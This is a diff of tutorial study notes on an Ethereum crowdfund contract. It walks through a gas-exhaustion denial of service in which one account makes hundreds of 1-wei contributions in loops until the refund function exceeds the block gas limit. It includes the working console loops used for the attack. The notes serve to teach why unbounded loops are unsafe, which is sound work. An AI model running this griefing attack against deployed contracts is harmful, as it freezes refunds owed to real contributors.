@@ -2,4 +2,54 @@ https://www.youtube.com/watch?v=8ZL16P4C23c&list=PLV1JDFUtrXpFh85G-Ddyy2kLSafaB9
 
 Contract - crowdfund.sol
 
-var deploy = decypher.createContract('crowdfund.sol', [acct1,web3.toWei(10,'ether'),10000], {gas:1000000})
+var deployed = decypher.createContract('crowdfund.sol', [acct1,web3.toWei(10,'ether'),10000], {gas:1000000})
+
+
+deployed.contribute({value: web3.toWei(1, 'ether'), from:acct2})
+
+deployed.contribute({value: web3.toWei(1, 'ether'), from:acct3})
+deployed.contribute({value: web3.toWei(1, 'ether'), from:acct4})
+
+decypher.etherBalance(deployed)
+
+deployed.refund({from:acct1, gas:1000000})
+
+In the testrpc console, we see the refund transaction took 48356 gas.
+
+Each loop in the refund requires gas, so the more refunds the more gas it costs.
+
+
+So consider:
+
+deployed.contribute({value: web3.toWei(1, 'ether'), from:acct2})
+deployed.contribute({value: web3.toWei(1, 'ether'), from:acct3})
+deployed.contribute({value: web3.toWei(1, 'ether'), from:acct4})
+
+Now acct5 sends the smallest amout possible, 100 times:
+
+for(var i=0; i< 100; i++) { deployed.contribute({value:1, from: acct5}) }
+
+Now when we do the refund, it cost 953417 gas!
+
+Now scam it a total of 500 times
+
+for(var i=0; i< 500; i++) { deployed.contribute({value:1, from: acct5}) }
+
+Now when we refund, we get an error saying out of gas.
+
+We try boosting it to 200000 gas and still get an error.
+
+Try 5000000 - now we get a different error that says we exceeded the block
+gas limit. There's a cap on the max amount of gas that can be used to mine
+a transaction into the block chain.
+
+https://ethstats.net/
+
+If the transaction cost exceeds the gas limit it will be impossible to
+execute as it can't be sent to the block chain to be mined.
+
+Grab the last block number: 611
+
+web3.eth.getBlock(611)
+
+Output includes the gas limit.
